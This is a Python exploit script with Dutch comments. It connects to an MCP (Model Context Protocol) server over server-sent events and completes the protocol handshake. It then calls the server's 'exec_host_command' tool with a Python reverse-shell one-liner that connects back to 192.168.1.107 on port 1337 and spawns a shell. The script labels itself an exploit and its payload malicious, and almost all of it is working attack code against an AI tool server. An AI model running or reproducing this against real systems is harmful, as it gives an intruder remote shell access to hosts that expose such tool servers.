import requests
import sseclient # pip install sseclient-py
import json
import threading
MCP_URL = "http://192.168.1.100:5002"
POST_URL = ""
def listen_to_sse():
    global POST_URL
    response = requests.get(f"{MCP_URL}/sse", stream=True)
    client = sseclient.SSEClient(response)
    
    for event in client.events():
        if event.event == "endpoint":
            POST_URL = f"{MCP_URL}{event.data}"
            print(f"[*] Sessie opgezet! Berichten endpoint: {POST_URL}")
            # Start the handshake instead of directly exploiting
            threading.Thread(target=send_initialize).start()
            
        elif event.event == "message":
            data = json.loads(event.data)
            
            # Print foutmeldingen als de server klaagt
            if "error" in data:
                print(f"\n[-] Error van server: {data['error']}")
                break
                
            # Reactie op onze 'initialize' request (id=1)
            if data.get("id") == 1 and "result" in data:
                print("[*] Server geïnitialiseerd. Nu de exploit sturen...")
                threading.Thread(target=send_initialized_notification_and_exploit).start()
                
            # Reactie op onze 'tools/call' exploit (id=2)
            elif data.get("id") == 2 and "result" in data:
                print("\n[+] Resultaat van het commando:")
                content = data["result"].get("content", [])
                for item in content:
                    print(item.get("text", ""))
                break
def send_initialize():
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "exploit-client",
                "version": "1.0.0"
            }
        }
    }
    requests.post(POST_URL, json=payload)
def send_initialized_notification_and_exploit():
    # 1. Stuur verplichte notificatie dat we klaar zijn (geen id nodig)
    notify = {
        "jsonrpc": "2.0",
        "method": "notifications/initialized"
    }
    requests.post(POST_URL, json=notify)
    
    # 2. Nu sturen we de daadwerkelijke payload (met id=2)
    exploit = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "exec_host_command",
            "arguments": {
                "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"192.168.1.107\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'",
                "exec_mode": "local"
            }
        }
    }
    print(f"[*] Stuur malicious payload naar {POST_URL} ...")
    requests.post(POST_URL, json=exploit)
if __name__ == "__main__":
    print(f"[*] Verbinden met MCP Server op {MCP_URL} ...")
    listen_to_sse()
